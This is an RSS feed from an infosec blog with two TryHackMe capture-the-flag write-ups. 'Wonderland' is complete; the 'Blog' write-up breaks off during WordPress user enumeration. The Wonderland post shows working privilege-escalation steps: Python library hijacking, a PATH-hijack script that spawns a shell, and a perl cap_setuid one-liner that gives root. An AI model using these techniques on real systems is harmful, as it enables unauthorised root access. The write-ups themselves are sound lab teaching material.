<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on 0xSh1v4 Infosec Blog</title>
        <link>https://0xSh1v4.github.io/posts/</link>
        <description>Recent content in Posts on 0xSh1v4 Infosec Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sat, 12 Sep 2020 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://0xSh1v4.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Tryhackme- Wonderland Writeup</title>
            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/</link>
            <pubDate>Sat, 12 Sep 2020 00:00:00 +0000</pubDate>
            
            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/</guid>
            <description>The following write up is for the machine: Wonderland
Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
            <content type="html"><![CDATA[<p>The following write up is for the machine: Wonderland</p>
<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
<h2 id="synopsis">Synopsis</h2>
<p><a href="https://www.tryhackme.com/room/wonderland">Wonderland</a> is a wonderful machine with lots of interesting things to learn. Especially privilege escalation part is the best so far I&rsquo;ve done, You have to escalate three times which includes different weak SUID permssion and then weak SUID Capabilities configurations which allow us to obtain the root and user flag at the end.</p>
<h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
<p>As usual, let us run the nmap tool to can the target network.</p>
<h3 id="nmap-results">Nmap Results:</h3>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
└─$ nmap -sC -sV -oA top 10.10.20.227
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-12 01:37 CEST
Nmap scan report for 10.10.20.227
Host is up (0.081s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
</code></pre><p>We found only two ports (22 and 80) open for this device. We also see that ssh runs on port 22 and http on port 80 with the version (GOlang net/http server)lets find the gobuster results</p>
<h3 id="gobuster-results">Gobuster Results:</h3>
<p>We have obtained the below results from the gobuster.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.20.227
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.20.227
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/12 01:37:48 Starting gobuster
===============================================================
/img (Status: 301)
/r (Status: 301)
/poem (Status: 301)
/http%3A%2F%2Fwww (Status: 301)
/http%3A%2F%2Fyoutube (Status: 301)
/http%3A%2F%2Fblogs (Status: 301)
/http%3A%2F%2Fblog (Status: 301)
/**http%3A%2F%2Fwww (Status: 301)
/http%3A%2F%2Fcommunity (Status: 301)
/http%3A%2F%2Fradar (Status: 301)
/http%3A%2F%2Fjeremiahgrossman (Status: 301)
/http%3A%2F%2Fweblog (Status: 301)
/http%3A%2F%2Fswik (Status: 301)
===============================================================
2020/09/12 01:54:06 Finished
===============================================================
</code></pre><p>On port 80, we have the webpage.</p>
<p>Rabbit Machine Homepage:
<figure>
    <img src="/Tryhackme/Wonderland/1.png"
         alt="Tryhackme: Wonderland machine - Homepage"/> <figcaption>
            <p>Tryhackme: Wonderland machine - Homepage</p>
        </figcaption>
</figure>
</p>
<h2 id="exploitation">Exploitation</h2>
<p>I have downloaded the image and tried to check if there are any infos hidden inside the image file.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
└─$ steghide --extract -sf white_rabbit_1.jpg
Enter passphrase:
wrote extracted data to &quot;hint.txt&quot;.                     

┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
└─$ cat hint.txt
follow the r a b b i t
</code></pre><p>We just got this information.</p>
<p>Further looking into /img location, I have found three image files.</p>
<figure>
    <img src="/Tryhackme/Wonderland/2.png"
         alt="Tryhackme: Wonderland machine - Image Files"/> <figcaption>
            <p>Tryhackme: Wonderland machine - Image Files</p>
        </figcaption>
</figure>

<p>I have tried to decrypt the three, but couldn&rsquo;t find anything except the hint saying &ldquo;follow the rabbit&rdquo;.</p>
<p>From the gobuster results, we found the /r path. So, I have tried adding /a next to /r, so it becomes /r/a and when I fulfill it according to the hint, which we got, then it will be</p>
<figure>
    <img src="/Tryhackme/Wonderland/3.png"
         alt="Tryhackme: Wonderland machine - Follow the rabbit"/> <figcaption>
            <p>Tryhackme: Wonderland machine - Follow the rabbit</p>
        </figcaption>
</figure>

<p>Now, we again went to the deadend. I didn&rsquo;t know what I had to do after this.</p>
<p>I just looked into the source and code and I saw some sensitive credentials.</p>
<figure>
    <img src="/Tryhackme/Wonderland/4.png"
         alt="Tryhackme: Wonderland machine - Sensitive Information"/> <figcaption>
            <p>Tryhackme: Wonderland machine - Sensitive Information</p>
        </figcaption>
</figure>

<p>Now, I have tried to use this creds for SSH and luckily,we got the shell popped up into the machine.
<figure>
    <img src="/Tryhackme/Wonderland/5.png"
         alt="Tryhackme: Wonderland machine - SSH as ALice"/> <figcaption>
            <p>Tryhackme: Wonderland machine - SSH as ALice</p>
        </figcaption>
</figure>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>We found the following information from the /home directory:</p>
<pre><code>alice@wonderland:/home$ ls
alice  hatter  rabbit  tryhackme
alice@wonderland:/home$ ls alice/
root.txt  walrus_and_the_carpenter.py
alice@wonderland:/home$ ls -la alice/
total 40
drwxr-xr-x 5 alice alice 4096 May 25 17:52 .
drwxr-xr-x 6 root  root  4096 May 25 17:52 ..
lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -&gt; /dev/null
-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25 02:36 .bashrc
drwx------ 2 alice alice 4096 May 25 16:37 .cache
drwx------ 3 alice alice 4096 May 25 16:37 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25 02:52 .local
-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
-rw------- 1 root  root    66 May 25 17:08 root.txt
-rw-r--r-- 1 root  root  3577 May 25 02:43 walrus_and_the_carpenter.py
alice@wonderland:/home$
</code></pre><p>So, I ran sudo -l, to see if it works.</p>
<pre><code>alice@wonderland:/home$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
</code></pre><p>we found that alice can run the following script with sudo as rabbit user.</p>
<p>Looking at the following script, we found the random python library was included.</p>
<figure>
    <img src="/Tryhackme/Wonderland/6.png"
         alt="Tryhackme: Wonderland machine - python executable library"/> <figcaption>
            <p>Tryhackme: Wonderland machine - python executable library</p>
        </figcaption>
</figure>

<p>Then, I tried to create a python file name random.py with the script and try to escalate to rabbit user. (Took a while to identify, before that I found few other ways to escalate priv but it can&rsquo;t be done from Alice user.)</p>
<figure>
    <img src="/Tryhackme/Wonderland/7.png"
         alt="Tryhackme: Wonderland machine - Escalation to Rabbit"/> <figcaption>
            <p>Tryhackme: Wonderland machine - Escalation to Rabbit</p>
        </figcaption>
</figure>

<p>Just created a file name random with the following line and executed as the user rabbit to elevate the priv to rabbit.</p>
<h2 id="post-exploitation">Post-Exploitation:</h2>
<p>Rabbit can able to execute the teaparty file.</p>
<pre><code>rabbit@wonderland:/home/rabbit$ ls
teaParty
rabbit@wonderland:/home/rabbit$ find / -perm -u=s -type f 2&gt;/dev/null
/home/rabbit/teaParty
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/sudo
/bin/fusermount
/bin/umount
/bin/ping
/bin/mount
/bin/su
rabbit@wonderland:/home/rabbit$ /home/rabbit/teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sat, 12 Sep 2020 12:36:31 +0000
Ask very nicely, and I will give you some tea while you wait for him
ok
Segmentation fault (core dumped)
</code></pre><p>So, It seems like we need to escalate the privilege for the user <strong>Hatter</strong>. But it has to do with this file. I have tried strace command, but haven&rsquo;t found anything interesting. So, I have downloaded the file and tried to examine it.</p>
<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
└─$ strings teaParty          
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' &amp;&amp; date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$&quot;
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
</code></pre><p>From the above, I found the &ldquo;date&rdquo; binary has been used to run with a relative path. So, now its more like the previous exploitation technique. So, lets create a date executable file.</p>
<pre><code>rabbit@wonderland:/home/rabbit$ cat date
#!/bin/bash
/bin/sh
</code></pre><p>Now we gave the executable permission for the file. Now we need to add this path to the env.</p>
<figure>
    <img src="/Tryhackme/Wonderland/8.png"
         alt="Tryhackme: Wonderland machine - Set ENV variable to elevate priv to Hatter"/> <figcaption>
            <p>Tryhackme: Wonderland machine - Set ENV variable to elevate priv to Hatter</p>
        </figcaption>
</figure>

<p>So, now the binary will look for the date first from the /home/rabbit directory.</p>
<p>So, lets execute the script.</p>
<pre><code>rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by $ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
$ whoami
hatter
</code></pre><p>So, we have escalated our priv to hatter.</p>
<p>Lets change this shell to full spawn tty.</p>
<p><code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
<figure>
    <img src="/Tryhackme/Wonderland/9.png"
         alt="Tryhackme: Wonderland machine - Escalation to Rabbit"/> <figcaption>
            <p>Tryhackme: Wonderland machine - Escalation to Rabbit</p>
        </figcaption>
</figure>

<p>Now, we have obtained the password from the hatter home directory.</p>
<p>lets do su hatter with the password to logged in as a 100% priv user.</p>
<p>Before when I tried Linpeas.sh script, I found the SUID capabilities is being set for this Hatter/root to excute the perl.</p>
<pre><code>hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
hatter@wonderland:~$ getcap -r / 2&gt;/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
</code></pre><p>Now, lets elevate the privileges using the following command to get the root.</p>
<p>Read more: <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/">SUID-Capabilities</a></p>
<pre><code>hatter@wonderland:/tmp$ getcap -r / 2&gt;/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
hatter@wonderland:/tmp$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;'
root@wonderland:/tmp# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
root@wonderland:/tmp# whoami
root
</code></pre><p>Now, we got the user.txt from /root folder and the root.txt from the alice folder.</p>
<figure>
    <img src="/Tryhackme/Wonderland/10.png"
         alt="Tryhackme: Wonderland machine - Getting root.txt file"/> <figcaption>
            <p>Tryhackme: Wonderland machine - Getting root.txt file</p>
        </figcaption>
</figure>

<p>And thats how we got the root flag. To be honest, I spend lots of time in the first escalation part from alice to rabbit, it din&rsquo;t strike to me in the beginning. I loved the escalation in this machine from Alice -&gt; Rabbit-&gt; Hatter -&gt; Root. Learned so much out of this box.</p>
<p>Thanks for reading! Prost! 🍺</p>
<p>If you have any questions: Feel free to contact me.</p>
<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
<p><figure>
    <img src="/HTB_profile.png"
         alt="HTB_Profile"/> 
</figure>

<figure>
    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
         alt="Tryhackme"/> 
</figure>
</p>
]]></content>
        </item>
        
        <item>
            <title>Tryhackme- Blog Writeup</title>
            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-blog-writeup/</link>
            <pubDate>Mon, 07 Sep 2020 00:00:00 +0000</pubDate>
            
            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-blog-writeup/</guid>
            <description>The following write up is for the machine: Blog
Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
            <content type="html"><![CDATA[<p>The following write up is for the machine: Blog</p>
<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
<h2 id="synopsis">Synopsis</h2>
<p><a href="https://tryhackme.com/room/blog">Blog</a> is the typical boot2root machine where we need to find two flags in the machine. It comes with an interesting part of wordpress exploitation and the privilege escalation done via weak SUID permissions and first time, I am using ltrace in the machine, so I have learned a new command and tool now by which we will obtain our root flag and then we found the user flag which is hidden inside the machine.</p>
<h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
<p>As usual, let us run the nmap tool to can the target network.</p>
<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
└─$ nmap -sC -sV -oA top 10.10.129.169                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 14:36 CEST
Nmap scan report for blog.thm (10.10.129.169)
Host is up (0.50s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef🆎b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
|_nbstat: NetBIOS name: BLOG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2020-09-05T12:36:29+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-05T12:36:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.84 seconds
</code></pre><h3 id="wordpress-scan">Wordpress scan</h3>
<p>Since, the scan results shows the present of wordpress. lets run the wordpress scan.</p>
<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
└─$ wpscan --url http://10.10.129.169                                                                                                   1 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.4
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.129.169/ [10.10.129.169]
[+] Started: Sat Sep  5 14:38:16 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.129.169/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.129.169/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.129.169/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.129.169/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
``
[+] The external WP-Cron seems to be enabled: http://10.10.129.169/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.129.169/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.129.169/, Match: 'WordPress 5.0'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 &lt;===============================================================&gt; (21 / 21) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Sep  5 14:38:27 2020
[+] Requests Done: 56
[+] Cached Requests: 5
[+] Data Sent: 11.123 KB
[+] Data Received: 15.214 MB
[+] Memory used: 192.547 MB
[+] Elapsed time: 00:00:11
</code></pre><h3 id="dirb-results">Dirb Results:</h3>
<p>Now, lets run the dirb to identify any folders.</p>
<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
└─$ dirb http://10.10.129.169

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Sep  5 14:36:32 2020
URL_BASE: http://10.10.129.169/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.129.169/ ----
==&gt; DIRECTORY: http://10.10.129.169/0/                                                                                                                                                                                                       
+ http://10.10.129.169/admin (CODE:302|SIZE:0)                                                                                                                                                                                               
+ http://10.10.129.169/atom (CODE:301|SIZE:0)                                                                                                                                                                                                
+ http://10.10.129.169/dashboard (CODE:302|SIZE:0)                                                                                                                                                                                           
==&gt; DIRECTORY: http://10.10.129.169/embed/                                                                                                                                                                                                   
+ http://10.10.129.169/favicon.ico (CODE:200|SIZE:0)                                                                                                                                                                                         
==&gt; DIRECTORY: http://10.10.129.169/feed/                                                                                                                                                                                                    
+ http://10.10.129.169/index.php (CODE:301|SIZE:0)                                                                                                                                                                                           
+ http://10.10.129.169/login (CODE:302|SIZE:0)                                                                                                                                                                                               
+ http://10.10.129.169/page1 (CODE:301|SIZE:0)                                                                                                                                                                                               
+ http://10.10.129.169/rdf (CODE:301|SIZE:0)
+ http://10.10.129.169/robots.txt (CODE:200|SIZE:67)                                                                                                                                                                                         
+ http://10.10.129.169/rss (CODE:301|SIZE:0)                                                                                                                                                                                                 
+ http://10.10.129.169/rss2 (CODE:301|SIZE:0)                                                                                                                                                                                                
+ http://10.10.129.169/server-status (CODE:403|SIZE:278)                                                                                                                                                                                     
==&gt; DIRECTORY: http://10.10.129.169/wp-admin/                                                                                                                                                                                                
==&gt; DIRECTORY: http://10.10.129.169/wp-content/                                                                                                                                                                                              
==&gt; DIRECTORY: http://10.10.129.169/wp-includes/                                                                                                                                                                                             
+ http://10.10.129.169/xmlrpc.php (CODE:405|SIZE:42)   
</code></pre><h2 id="smb-enumeration">SMB Enumeration:</h2>
<p>I also ran <em>enum4linux</em> since I found some smb port 139 and 445.</p>
<p>Read this nice article about SMB Enumeration: <a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">SMB-Enumeration</a></p>
<p>From the results of enum4linux, I found that anonymous smbshare accessiblity is possible. But there were only image files and doesn&rsquo;t help us much.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
└─$ smbclient -L 10.10.129.169   
Enter WORKGROUP\zeus's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	BillySMB        Disk      Billy's local SMB Share
	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
</code></pre><h2 id="enum4linux">Enum4linux</h2>
<p>From the enum4linux, we got the following users information.</p>
<ul>
<li>S-1-22-1-1000 Unix User\bjoel (Local User)</li>
<li>S-1-22-1-1001 Unix User\smb (Local User)</li>
<li>BLOG\None</li>
<li>BLOG\nobody</li>
</ul>
<p>Extracting the image which we got from smb share, gave the below info.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
└─$ steghide --extract -sf Alice-White-Rabbit.jpg
Enter passphrase: 
the file &quot;rabbit_hole.txt&quot; does already exist. overwrite ? (y/n) y
wrote extracted data to &quot;rabbit_hole.txt&quot;.
                  
┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
└─$ cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend.
</code></pre><h2 id="enumerating-the-network">Enumerating the network</h2>
<p>So, I have tried enumerating the user <em>bjoel</em> with rockyou. But doesn&rsquo;t get anything.</p>
<p>So, I tried the <em>wpscanner</em> with <strong>-e</strong>  and <strong>u</strong> flag which tells wpscan to enumerate the user IDs</p>
<p>wp enumeration:</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Blog]
└─$ wpscan --url http://10.10.129.169 -e u                                                          
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.4
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.129.169/ [10.10.129.169]
[+] Started: Sat Sep  5 15:33:41 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.129.169/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.129.169/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.129.169/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.129.169/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.129.169/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.129.169/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.129.169/, Match: 'WordPress 5.0'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 &lt;================================================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.129.169/wp-json/wp/v2/users/?per_page=100&amp;page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.129.169/wp-json/wp/v2/users/?per_page=100&amp;page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Sep  5 15:33:47 2020
[+] Requests Done: 53
[+] Cached Requests: 8
